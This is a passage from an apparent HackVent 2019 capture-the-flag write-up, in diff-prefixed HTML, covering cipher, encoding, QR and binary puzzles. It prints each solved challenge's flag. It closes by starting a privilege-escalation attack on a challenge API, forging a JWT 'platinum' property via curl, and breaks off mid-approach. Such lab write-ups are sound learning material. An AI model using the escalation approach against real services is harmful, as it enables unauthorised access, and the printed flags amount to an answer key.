class="kw">&lt;/em&gt;</span>l<span class="kw">&lt;em&gt;</span>y<span class="kw">&lt;/em&gt;</span>, <span class="kw">&lt;em&gt;</span>he<span class="kw">&lt;/em&gt;</span> a<span class="kw">&lt;em&gt;</span>rgue<span class="kw">&lt;/em&gt;</span>d sc<span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>en<span class="kw">&lt;em&gt;</span>c<span class="kw">&lt;/em&gt;</span>e co<span class="kw">&lt;em&gt;</span>uld<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>b<span class="kw">&lt;/em&gt;</span>e <span class="kw">&lt;em&gt;</span>a<span class="kw">&lt;/em&gt;</span>c<span class="kw">&lt;em&gt;</span>hi<span class="kw">&lt;/em&gt;</span>eved by us<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span> of a <span class="kw">&lt;em&gt;</span>s<span class="kw">&lt;/em&gt;</span>ce<span class="kw">&lt;em&gt;</span>p<span class="kw">&lt;/em&gt;</span>t<span class="kw">&lt;em&gt;</span>ical<span class="kw">&lt;/em&gt;</span> a<span class="kw">&lt;em&gt;</span>nd<span class="kw">&lt;/em&gt;</span> me<span class="kw">&lt;em&gt;</span>t<span class="kw">&lt;/em&gt;</span>hod<span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>ca<span class="kw">&lt;em&gt;</span>l<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>a<span class="kw">&lt;/em&gt;</span>pp<span class="kw">&lt;em&gt;</span>roa<span class="kw">&lt;/em&gt;</span>ch wh<span class="kw">&lt;em&gt;</span>er<span class="kw">&lt;/em&gt;</span>eby <span class="kw">&lt;em&gt;</span>s<span class="kw">&lt;/em&gt;</span>cientist<span class="kw">&lt;em&gt;</span>s<span class="kw">&lt;/em&gt;</span> ai<span class="kw">&lt;em&gt;</span>m<span class="kw">&lt;/em&gt;</span> t<span class="kw">&lt;em&gt;</span>o<span class="kw">&lt;/em&gt;</span> avo<span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>d m<span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>sl<span class="kw">&lt;em&gt;</span>ead<span class="kw">&lt;/em&gt;</span>in<span class="kw">&lt;em&gt;</span>g<span class="kw">&lt;/em&gt;</span> themsel<span class="kw">&lt;em&gt;</span>ve<span class="kw">&lt;/em&gt;</span>s. <span class="kw">&lt;em&gt;</span>A<span class="kw">&lt;/em&gt;</span>lth<span class="kw">&lt;em&gt;</span>oug<span class="kw">&lt;/em&gt;</span>h <span class="kw">&lt;em&gt;</span>h<span class="kw">&lt;/em&gt;</span>is <span class="kw">&lt;em&gt;</span>p<span class="kw">&lt;/em&gt;</span>ra<span class="kw">&lt;em&gt;</span>c<span class="kw">&lt;/em&gt;</span>tic<span class="kw">&lt;em&gt;</span>a<span class="kw">&lt;/em&gt;</span>l i<span class="kw">&lt;em&gt;</span>d<span class="kw">&lt;/em&gt;</span>e<span class="kw">&lt;em&gt;</span>a<span class="kw">&lt;/em&gt;</span>s ab<span class="kw">&lt;em&gt;</span>out<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>s<span class="kw">&lt;/em&gt;</span>u<span class="kw">&lt;em&gt;</span>ch<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>a<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>m<span class="kw">&lt;/em&gt;</span>et<span class="kw">&lt;em&gt;</span>h<span class="kw">&lt;/em&gt;</span>od, <span class="kw">&lt;em&gt;</span>t<span class="kw">&lt;/em&gt;</span>he B<span class="kw">&lt;em&gt;</span>a<span class="kw">&lt;/em&gt;</span>con<span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>an meth<span class="kw">&lt;em&gt;</span>o<span class="kw">&lt;/em&gt;</span>d, d<span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>d no<span class="kw">&lt;em&gt;</span>t<span class="kw">&lt;/em&gt;</span> have <span class="kw">&lt;em&gt;</span>a<span class="kw">&lt;/em&gt;</span> l<span class="kw">&lt;em&gt;</span>o<span class="kw">&lt;/em&gt;</span>n<span class="kw">&lt;em&gt;</span>g<span class="kw">&lt;/em&gt;</span>-<span class="kw">&lt;em&gt;</span>la<span class="kw">&lt;/em&gt;</span>s<span class="kw">&lt;em&gt;</span>t<span class="kw">&lt;/em&gt;</span>ing <span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>nfluen<span class="kw">&lt;em&gt;</span>c<span class="kw">&lt;/em&gt;</span>e, <span class="kw">&lt;em&gt;</span>th<span class="kw">&lt;/em&gt;</span>e <span class="kw">&lt;em&gt;</span>g<span class="kw">&lt;/em&gt;</span>e<span class="kw">&lt;em&gt;</span>ne<span class="kw">&lt;/em&gt;</span>ral <span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>dea <span class="kw">&lt;em&gt;</span>of<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>t<span class="kw">&lt;/em&gt;</span>he imp<span class="kw">&lt;em&gt;</span>o<span class="kw">&lt;/em&gt;</span>rta<span class="kw">&lt;em&gt;</span>n<span class="kw">&lt;/em&gt;</span>ce and pos<span class="kw">&lt;em&gt;</span>s<span class="kw">&lt;/em&gt;</span>i<span class="kw">&lt;em&gt;</span>b<span class="kw">&lt;/em&gt;</span>il<span class="kw">&lt;em&gt;</span>it<span class="kw">&lt;/em&gt;</span>y o<span class="kw">&lt;em&gt;</span>f<span class="kw">&lt;/em&gt;</span> a s<span class="kw">&lt;em&gt;</span>c<span class="kw">&lt;/em&gt;</span>ept<span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>cal methodology makes Bacon the father of the scientific method. This method was a new rhetorical and theoretical framework for science, the practical details of which are still central in debates about science and methodology.<span class="kw">&lt;/p&gt;</span></span></code></pre></div>
+<p>Along with the following box:</p>
+<pre><code>Born: January 22                                                  
+Died: April 9                                                 
+Mother: Lady Anne                                             
+Father: Sir Nicholas                                                          
+Secrets: unknown                                                  
+</code></pre>
+<h2 id="approach-4">Approach</h2>
+<p>Luckily, Bacon was pretty knowledgeable and created a cipher (at least, I assume it was the same person) named after him.</p>
+<p>Translating all emphasized characters into an 'A' and all other characters into a 'B' led to a decodable string producing:</p>
+<pre><code>SANTALIKESHISBACONBUTALSOTHISBACONTHEPASSWORDISHVXBACONCIPHERISSIMPLEBUTCOOLXREPLACEXWITHBRACKETSANDUSEUPPERCASEFORALLCHARACTER
+</code></pre>
+<h2 id="flag-5">Flag</h2>
+<p><code>HV19{BACONCIPHERISSIMPLEBUTCOOL}</code></p>
+<h1 id="hv1907---santa-rider">HV19.07 - Santa rider</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>inik</td>
+<td>easy</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-6">Given</h2>
+<p>"Santa is prototyping a new gadget for his sledge. Unfortunately it still has some glitches, but look for yourself."</p>
+<p>An embedded video from <a href="https://academy.hacking-lab.com/api/media/challenge/mp4/13e4f1a0-bb71-44ec-be54-3f5f23991033.mp4">https://academy.hacking-lab.com/api/media/challenge/mp4/13e4f1a0-bb71-44ec-be54-3f5f23991033.mp4</a> For easy download, get it here: <a href="3dbe0c12-d794-4f79-ae67-09ac27bd099d.zip">HV19-SantaRider.zip</a></p>
+<h2 id="approach-5">Approach</h2>
+<p>Decode, frame by frame, all bytes that can be seen in the film. This results in:</p>
+<pre><code>01001000
+01010110
+00110001
+00111001
+01111011
+00110001
+01101101
+01011111
+01100001
+01101100
+01110011
+00110000
+01011111
+01110111
+00110000
+01110010
+01101011
+00110001
+01101110
+01100111
+01011111
+00110000
+01101110
+01011111
+01100001
+01011111
+01110010
+00110011
+01101101
+00110000
+01110100
+00110011
+01011111
+01100011
+00110000
+01101110
+01110100
+01110010
+00110000
+01101100
+01111101
+</code></pre>
+<p>Which can be converted to ASCII, producing the flag.</p>
+<h2 id="flag-6">Flag</h2>
+<p><code>HV19{1m_als0_w0rk1ng_0n_a_r3m0t3_c0ntr0l}</code></p>
+<h1 id="hv1908---smilencryptor-40">HV19.08 - SmileNcryptor 4.0</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>otaku</td>
+<td>medium</td>
+<td>crypto; reverse engineering</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-7">Given</h2>
+<h3 id="description">Description</h3>
+<p>You hacked into the system of very-secure-shopping.com and you found a SQL-Dump with $$-creditcards numbers. As a good hacker you inform the company from which you got the dump. The managers tell you that they don't worry, because the data is encrypted.</p>
+<p>Dump-File: <a href="c635204a-6347-45d7-91f8-bd7b94b111f1.zip">dump.zip</a></p>
+<h3 id="goal">Goal</h3>
+<p>Analyze the "Encryption"-method and try to decrypt the flag.</p>
+<h3 id="hints">Hints</h3>
+<ul>
+<li>CC-Numbers are valid ones.</li>
+<li>Cyber-Managers often doesn't know the difference between encoding and encryption.</li>
+</ul>
+<h3 id="additional-info">Additional info</h3>
+<p>In the SQL dump, the following entries could be found:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode default"><code class="sourceCode default"><span id="cb9-1"><a href="#cb9-1"></a># `creditcards` table</span>
+<span id="cb9-2"><a href="#cb9-2"></a>(1,&#39;Sirius Black&#39;,      &#39;:)QVXSZUVY\ZYYZ[a&#39; ,&#39;12/2020&#39;),</span>
+<span id="cb9-3"><a href="#cb9-3"></a>(2,&#39;Hermione Granger&#39;,  &#39;:)QOUW[VT^VY]bZ_&#39;  ,&#39;04/2021&#39;),</span>
+<span id="cb9-4"><a href="#cb9-4"></a>(3,&#39;Draco Malfoy&#39;,      &#39;:)SPPVSSYVV\YY_\\]&#39;,&#39;05/2020&#39;),</span>
+<span id="cb9-5"><a href="#cb9-5"></a>(4,&#39;Severus Snape&#39;,     &#39;:)RPQRSTUVWXYZ[\]^&#39;,&#39;10/2020&#39;),</span>
+<span id="cb9-6"><a href="#cb9-6"></a>(5,&#39;Ron Weasley&#39;,       &#39;:)QTVWRSVUXW[_Z`\b&#39;,&#39;11/2020&#39;);</span>
+<span id="cb9-7"><a href="#cb9-7"></a></span>
+<span id="cb9-8"><a href="#cb9-8"></a># `flags` table</span>
+<span id="cb9-9"><a href="#cb9-9"></a>(1,&#39;HV19{&#39;,&#39;:)SlQRUPXWVo\Vuv_n_\ajjce&#39;,&#39;}&#39;);</span></code></pre></div>
+<h2 id="aproach">Aproach</h2>
+<p>From the text it was clear that the ciphertext had to be reverted to a numeric string with a length of 14 to 19 positions (length of credit card numbers). It became also relatively clear from the quotation marks, that the encryption was more of an encoding and that it had to be some poor man's approach (which was also confirmed by <code>DrSchottky</code> later in the chat).</p>
+<p>Looking at the given ciphertext with the algorithm being "SmileNcryptor 4.0", I simply dropped the prefixing smiley faces with them not adding any additional information (except that it's actually ciphertext).</p>
+<p>An analysis of the ciphertext alphabet (of credit card numbers only) provides the following alphabet, which is already longer than the wanted 10 characters (0-9):</p>
+<pre><code>[\]^_`abOPQRSTUVWXYZ
+</code></pre>
+<p>Other than that, it seems that characters that lay higher in the ASCII value space appear only later in the ciphertext.</p>
+<p><code>multifred</code>, at some point (late at night/early in the morning), posted an incredible analysis that was a real eye opener (in the next morning) for me. He mapped ciphertext characters against an ASCII axis, which looks like this:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode default"><code class="sourceCode default"><span id="cb11-1"><a href="#cb11-1"></a>-----------------------------------------------------------------------------------------------</span>
+<span id="cb11-2"><a href="#cb11-2"></a>!&quot;#$%&amp;&#39;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~</span>
+<span id="cb11-3"><a href="#cb11-3"></a>                         :</span>
+<span id="cb11-4"><a href="#cb11-4"></a>        )</span>
+<span id="cb11-5"><a href="#cb11-5"></a>                                                  S</span>
+<span id="cb11-6"><a href="#cb11-6"></a>                                               P</span>
+<span id="cb11-7"><a href="#cb11-7"></a>                                               P     </span>
+<span id="cb11-8"><a href="#cb11-8"></a>                                                     V</span>
+<span id="cb11-9"><a href="#cb11-9"></a>                                                  S</span>
+<span id="cb11-10"><a href="#cb11-10"></a>                                                  S</span>
+<span id="cb11-11"><a href="#cb11-11"></a>                                                        Y</span>
+<span id="cb11-12"><a href="#cb11-12"></a>                                                     V</span>
+<span id="cb11-13"><a href="#cb11-13"></a>                                                     V     </span>
+<span id="cb11-14"><a href="#cb11-14"></a>                                                           \</span>
+<span id="cb11-15"><a href="#cb11-15"></a>                                                        Y</span>
+<span id="cb11-16"><a href="#cb11-16"></a>                                                        Y</span>
+<span id="cb11-17"><a href="#cb11-17"></a>                                                              _</span>
+<span id="cb11-18"><a href="#cb11-18"></a>                                                           \</span>
+<span id="cb11-19"><a href="#cb11-19"></a>                                                           \</span>
+<span id="cb11-20"><a href="#cb11-20"></a>                                                            ]</span></code></pre></div>
+<p>This shows nicely, how a "decryption" algorithm needs to shift the characters to the left into the numeric part of the ASCII space.</p>
+<p>It also shows, that the spectrum of cipher characters was wider than the spectrum of numeric characters. In combination with the fact that the distribution seems to drift to the right, which represents higher ASCII values, the of each character could have an influence.</p>
+<p>Let's script that... And indeed: By substracting from the character value a fixed offset and it's position's value, a printable, numeric ASCII character was produced.</p>
+<p>Here's the code:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb12-1"><a href="#cb12-1"></a><span class="co">#!/usr/bin/env python</span></span>
+<span id="cb12-2"><a href="#cb12-2"></a></span>
+<span id="cb12-3"><a href="#cb12-3"></a>DEFAULT_OFFSET <span class="op">=</span> <span class="dv">30</span></span>
+<span id="cb12-4"><a href="#cb12-4"></a></span>
+<span id="cb12-5"><a href="#cb12-5"></a>ciphertext <span class="op">=</span> [</span>
+<span id="cb12-6"><a href="#cb12-6"></a>    <span class="st">&quot;QVXSZUVY</span><span class="ch">\\</span><span class="st">ZYYZ[a&quot;</span>,</span>
+<span id="cb12-7"><a href="#cb12-7"></a>    <span class="st">&quot;QOUW[VT^VY]bZ_&quot;</span>,</span>
+<span id="cb12-8"><a href="#cb12-8"></a>    <span class="st">&quot;SPPVSSYVV</span><span class="ch">\\</span><span class="st">YY_</span><span class="ch">\\\\</span><span class="st">]&quot;</span>,</span>
+<span id="cb12-9"><a href="#cb12-9"></a>    <span class="st">&quot;RPQRSTUVWXYZ[</span><span class="ch">\\</span><span class="st">]^&quot;</span>,</span>
+<span id="cb12-10"><a href="#cb12-10"></a>    <span class="st">&quot;QTVWRSVUXW[_Z`</span><span class="ch">\\</span><span class="st">b&quot;</span></span>
+<span id="cb12-11"><a href="#cb12-11"></a>]</span>
+<span id="cb12-12"><a href="#cb12-12"></a>flag <span class="op">=</span> <span class="st">&quot;SlQRUPXWVo</span><span class="ch">\\</span><span class="st">Vuv_n_</span><span class="ch">\\</span><span class="st">ajjce&quot;</span></span>
+<span id="cb12-13"><a href="#cb12-13"></a></span>
+<span id="cb12-14"><a href="#cb12-14"></a></span>
+<span id="cb12-15"><a href="#cb12-15"></a><span class="kw">def</span> decrypt_char(character, index):</span>
+<span id="cb12-16"><a href="#cb12-16"></a>    character_val <span class="op">=</span> <span class="bu">ord</span>(character) <span class="op">-</span> DEFAULT_OFFSET <span class="op">-</span> index</span>
+<span id="cb12-17"><a href="#cb12-17"></a>    <span class="cf">try</span>:</span>
+<span id="cb12-18"><a href="#cb12-18"></a>        <span class="cf">return</span> <span class="bu">chr</span>(character_val)   </span>
+<span id="cb12-19"><a href="#cb12-19"></a>    <span class="cf">except</span> <span class="pp">Exception</span> <span class="im">as</span> e:</span>
+<span id="cb12-20"><a href="#cb12-20"></a>        <span class="bu">print</span>(<span class="st">&quot;Character </span><span class="sc">%x</span><span class="st"> could not be decrypted&quot;</span> <span class="op">%</span> <span class="bu">ord</span>(character))</span>
+<span id="cb12-21"><a href="#cb12-21"></a>        <span class="cf">return</span> <span class="st">&quot;X&quot;</span></span>
+<span id="cb12-22"><a href="#cb12-22"></a>    </span>
+<span id="cb12-23"><a href="#cb12-23"></a><span class="kw">def</span> decrypt_string(ciphertext):</span>
+<span id="cb12-24"><a href="#cb12-24"></a>    dec <span class="op">=</span> <span class="st">&quot;&quot;</span></span>
+<span id="cb12-25"><a href="#cb12-25"></a>    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="bu">len</span>(ciphertext)):</span>
+<span id="cb12-26"><a href="#cb12-26"></a>        dec <span class="op">+=</span> decrypt_char(ciphertext[i], i)</span>
+<span id="cb12-27"><a href="#cb12-27"></a>    <span class="cf">return</span> dec</span>
+<span id="cb12-28"><a href="#cb12-28"></a></span>
+<span id="cb12-29"><a href="#cb12-29"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
+<span id="cb12-30"><a href="#cb12-30"></a>    <span class="cf">for</span> c <span class="kw">in</span> ciphertext:</span>
+<span id="cb12-31"><a href="#cb12-31"></a>        <span class="bu">print</span>(<span class="st">&quot;Decrypting </span><span class="sc">%s</span><span class="st">&quot;</span> <span class="op">%</span> c)</span>
+<span id="cb12-32"><a href="#cb12-32"></a>        cleartext <span class="op">=</span> decrypt_string(c)</span>
+<span id="cb12-33"><a href="#cb12-33"></a>        <span class="bu">print</span>(<span class="st">&quot;</span><span class="sc">%s</span><span class="st"> (length: </span><span class="sc">%s</span><span class="st">)&quot;</span> <span class="op">%</span> (cleartext, <span class="bu">len</span>(cleartext)))</span>
+<span id="cb12-34"><a href="#cb12-34"></a></span>
+<span id="cb12-35"><a href="#cb12-35"></a>    <span class="bu">print</span>(<span class="st">&quot;Flag: HV19{</span><span class="sc">%s</span><span class="st">}&quot;</span> <span class="op">%</span> decrypt_string(flag))</span>
+<span id="cb12-36"><a href="#cb12-36"></a></span></code></pre></div>
+<p>Producing the output:</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1"></a>$ <span class="ex">python</span> smilencryptor.py </span>
+<span id="cb13-2"><a href="#cb13-2"></a><span class="ex">Decrypting</span> QVXSZUVY\ZYYZ[a</span>
+<span id="cb13-3"><a href="#cb13-3"></a><span class="ex">378282246310005</span> (length: 15)</span>
+<span id="cb13-4"><a href="#cb13-4"></a><span class="ex">Decrypting</span> QOUW[VT^VY]bZ_</span>
+<span id="cb13-5"><a href="#cb13-5"></a><span class="ex">30569309025904</span> (length: 14)</span>
+<span id="cb13-6"><a href="#cb13-6"></a><span class="ex">Decrypting</span> SPPVSSYVV\YY_<span class="dt">\\</span>]</span>
+<span id="cb13-7"><a href="#cb13-7"></a><span class="ex">5105105105105100</span> (length: 16)</span>
+<span id="cb13-8"><a href="#cb13-8"></a><span class="ex">Decrypting</span> RPQRSTUVWXYZ[<span class="dt">\]</span>^</span>
+<span id="cb13-9"><a href="#cb13-9"></a><span class="ex">4111111111111111</span> (length: 16)</span>
+<span id="cb13-10"><a href="#cb13-10"></a><span class="ex">Decrypting</span> QTVWRSVUXW[_Z<span class="kw">`</span>\<span class="ex">b</span></span>
+<span id="cb13-11"><a href="#cb13-11"></a><span class="ex">3566002020360505</span> (length: 16)</span>
+<span id="cb13-12"><a href="#cb13-12"></a><span class="ex">Flag</span>: HV19<span class="dt">{5M113-420H4-KK3A1-19801}</span></span>
+<span id="cb13-13"><a href="#cb13-13"></a></span></code></pre></div>
+<h2 id="flag-7">Flag</h2>
+<p><code>HV19{5M113-420H4-KK3A1-19801}</code></p>
+<h2 id="credits">Credits</h2>
+<p>Massive credits to <code>multifred</code> who posted the above ASCII-analysis, which was a new approach to me and which finally helped to find the solution.</p>
+<h1 id="hv1909---santas-quick-response-30">HV19.09 - Santas Quick Response 3.0</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>brp64 feat. M.</td>
+<td>medium</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-8">Given</h2>
+<p>Visiting the following railway station has left lasting memories.</p>
+<p><img src="bb374593-958a-479f-8328-79396471a7ab.png" alt="Cambridge North Railway station" /></p>
+<p>Santas brand new gifts distribution system is heavily inspired by it. Here is your personal gift, can you extract the destination path of it?</p>
+<p><img src="bd659aba-5ad2-4ad3-992c-6f99023792bc.png" alt="Santa&#39;s QR code" /></p>
+<h3 id="hints-1">Hints</h3>
+<ul>
+<li>it starts with a single pixel</li>
+<li>centering is hard</li>
+</ul>
+<h2 id="approach-6">Approach</h2>
+<p>Google Image search quickly led to a Wikipedia page about <a href="https://en.wikipedia.org/wiki/Rule_30">Rule 30</a>. The remaining question was, how to "apply" Rule 30 to fix the broken QR code?</p>
+<p>I tried a lot of things...</p>
+<h3 id="failed">Failed</h3>
+<p>Run rule 30 over the wrong QR code, line by line. And hereby, I mean "apply" Rule 30 to QR code pixels.</p>
+<p><em>Retrospectively: Yeah, I know... whatever..</em></p>
+<p>Another thought I had was that mabe Rule 30 was already applied and we'd have to reverse it? This also led to a "cul-de-sac".</p>
+<p>Another failed attempt was to AND/OR/XOR a Rule 30 image, with its peak in the (horizontal and vertical) center of the QR code.</p>
+<p><img src="rule30.png" alt="Rule 30" /></p>
+<h3 id="how-i-did-it">How I did it</h3>
+<p>Finally, I manually computed with XOR the needed pattern to re-establish the lower right target on the QR code:</p>
+<p><img src="manual-graphical-xor.png" alt="Manual pattern" /></p>
+<p>This seemed like a pattern that's present in the Rule 30 image. So I laid one image over another and XORed them to find the resulting image.</p>
+<p>Did I mention that I went down multiple rabbit holes that day? That's also why I did this programatically in Python...</p>
+<p><img src="out.flag.png" alt="Resulting QR code" /></p>
+<h3 id="how-it-could-have-been-done">How it could have been done</h3>
+<p>After solving, I thought about how it could have been done more easily.</p>
+<ul>
+<li>Open Santa's QR code in GIMP</li>
+<li>Overlay Rule 30 with 50% of transparency.</li>
+<li>Everything that's black or white becomes white, everything that's grey becomes black (graphical XOR)</li>
+</ul>
+<p><img src="constructed-flag-qr-w-graphical-superposition.png" alt="GIMP Rule 30 overlay" /></p>
+<h2 id="flag-8">Flag</h2>
+<p><code>HV19{Cha0tic_yet-0rdered}</code></p>
+<h1 id="hv1910---guess-what">HV19.10 - Guess what</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>inik</td>
+<td>medium</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-9">Given</h2>
+<p>The flag is right, of course</p>
+<p><a href="d658ab66-6859-416d-8554-9a4ee0105794.zip">HV10.10-guess3.zip</a></p>
+<h3 id="hints-2">Hints</h3>
+<ul>
+<li>New binary (v3) released at 20:00 CET</li>
+<li>Time for full points will be extended for additional 24 hours</li>
+<li>No asm needed</li>
+<li>run it on linux</li>
+</ul>
+<h2 id="approach-7">Approach</h2>
+<p>As the description says, there were two other binaries published before this one. I found the fact that everyone struggled (well, almost - kudos to @hardlock for fixing the binary and finding the flag) not too bad actually. It let me excercise a bit with <code>strace</code> and <code>ltrace</code>, which came in handy as soon as the real challenge was published.</p>
+<p>With the following command, the flag was printed out:</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1"></a>$ <span class="ex">strace</span> -e trace=execve -x -y -f -s10024  ./guess3</span>
+<span id="cb14-2"><a href="#cb14-2"></a><span class="ex">execve</span>(<span class="st">&quot;./guess3&quot;</span>, [<span class="st">&quot;./guess3&quot;</span>], 0x7ffdd43f0c80 /* 66 vars */) = <span class="ex">0</span></span>
+<span id="cb14-3"><a href="#cb14-3"></a><span class="ex">execve</span>(<span class="st">&quot;/bin/bash&quot;</span>, [<span class="st">&quot;./guess3&quot;</span>, <span class="st">&quot;-c&quot;</span>, <span class="st">&quot;exec &#39;./guess3&#39; </span><span class="dt">\&quot;</span><span class="va">$@</span><span class="dt">\&quot;</span><span class="st">&quot;</span>, <span class="st">&quot;./guess3&quot;</span>], 0x5567ea44c290 /* 67 vars */) = <span class="ex">0</span></span>
+<span id="cb14-4"><a href="#cb14-4"></a><span class="ex">execve</span>(<span class="st">&quot;/home/manu/Documents/hackvent19/dec10/_d658ab66-6859-416d-8554-9a4ee0105794.zip.extracted/guess3&quot;</span>, [<span class="st">&quot;./guess3&quot;</span>], 0x55ede84f3460 /* 66 vars */) = <span class="ex">0</span></span>
+<span id="cb14-5"><a href="#cb14-5"></a><span class="ex">execve</span>(<span class="st">&quot;/bin/bash&quot;</span>, [<span class="st">&quot;./guess3&quot;</span>, <span class="st">&quot;-c&quot;</span>, <span class="st">&quot;       </span></span>
+<span id="cb14-6"><a href="#cb14-6"></a><span class="st">        [ some whitespaces removed... ]</span></span>
+<span id="cb14-7"><a href="#cb14-7"></a><span class="st"> #!/bin/bash\n\nread -p </span><span class="dt">\&quot;</span><span class="st">Your input: </span><span class="dt">\&quot;</span><span class="st"> input\n\nif [ </span><span class="va">$input</span><span class="st"> = </span><span class="dt">\&quot;</span><span class="st">HV19{Sh3ll_0bfuscat10n_1s_fut1l3}</span><span class="dt">\&quot;</span><span class="st"> ] \nthen\n  echo </span><span class="dt">\&quot;</span><span class="st">success</span><span class="dt">\&quot;</span><span class="st">\nelse \n  echo </span><span class="dt">\&quot;</span><span class="st">nooooh. try harder!</span><span class="dt">\&quot;</span><span class="st">\nfi\n\n&quot;</span>, <span class="st">&quot;./guess3&quot;</span>], 0x7ffe99f75548 /* 65 vars */) = <span class="ex">0</span></span>
+<span id="cb14-8"><a href="#cb14-8"></a><span class="ex">Your</span> input: HV19<span class="dt">{Sh3ll_0bfuscat10n_1s_fut1l3}</span></span>
+<span id="cb14-9"><a href="#cb14-9"></a><span class="ex">success</span></span>
+<span id="cb14-10"><a href="#cb14-10"></a><span class="ex">+++</span> exited with 0 +++</span></code></pre></div>
+<p>So after all, the executable called itself a couple of times, only to run some script testing for whether or not the flag was entered.</p>
+<h2 id="flag-9">Flag</h2>
+<p><code>HV19{Sh3ll_0bfuscat10n_1s_fut1l3}</code></p>
+<h1 id="hv1911---frolicsome-santa-jokes-api">HV19.11 - Frolicsome Santa Jokes API</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>inik</td>
+<td>medium</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-10">Given</h2>
+<p>The elves created an API where you get random jokes about santa.</p>
+<p>Go and try it here: <a href="http://whale.hacking-lab.com:10101">http://whale.hacking-lab.com:10101</a></p>
+<h2 id="approach-8">Approach</h2>
+<p>For information gathering, I played through the scenario as described.</p>
+<p><img src="HV19.11_frolicsom_santa_jokes_api.png" alt="API specification" /></p>
+<p>Logging in with a user resulted in a token implementing a JWT:</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1"></a>$ <span class="ex">curl</span> -s -X POST -H <span class="st">&#39;Content-Type: application/json&#39;</span> http://whale.hacking-lab.com:10101/fsja/login --data <span class="st">&#39;{&quot;username&quot;:&quot;testuser&quot;, &quot;password&quot;: &quot;passwordpassword&quot;}&#39;</span></span>
+<span id="cb15-2"><a href="#cb15-2"></a></span>
+<span id="cb15-3"><a href="#cb15-3"></a>{<span class="st">&quot;message&quot;</span>:<span class="st">&quot;Token generated&quot;</span>,<span class="st">&quot;code&quot;</span>:<span class="ex">201</span>,<span class="st">&quot;token&quot;</span>:<span class="st">&quot;eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoidGVzdHVzZXIiLCJwbGF0aW51bSI6ZmFsc2V9LCJleHAiOjE1Nzc0Mzc4ODkuMzUzMDAwMDAwfQ.5msTsQB_qqB-samcp4CP4tS2DNWvdgILjpiBm-L_kqM&quot;</span>}</span></code></pre></div>
+<p>JWTs can be decoded:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb16-1"><a href="#cb16-1"></a><span class="fu">{</span></span>
+<span id="cb16-2"><a href="#cb16-2"></a>    <span class="dt">&quot;user&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb16-3"><a href="#cb16-3"></a>        <span class="dt">&quot;username&quot;</span><span class="fu">:</span> <span class="st">&quot;testuser&quot;</span><span class="fu">,</span></span>
+<span id="cb16-4"><a href="#cb16-4"></a>        <span class="dt">&quot;platinum&quot;</span><span class="fu">:</span> <span class="kw">false</span></span>
+<span id="cb16-5"><a href="#cb16-5"></a>    <span class="fu">},</span></span>
+<span id="cb16-6"><a href="#cb16-6"></a>    <span class="dt">&quot;exp&quot;</span><span class="fu">:</span> <span class="fl">1577437889.353</span></span>
+<span id="cb16-7"><a href="#cb16-7"></a><span class="fu">}</span></span></code></pre></div>
+<p>So let's try to bring that <code>platinum</code> property to a <code>true</code> value.</p>
+<h3 id="one-1">One</h3>
+<p>One variant that was successful was to simply add the property to the registration request of a new user:</p>
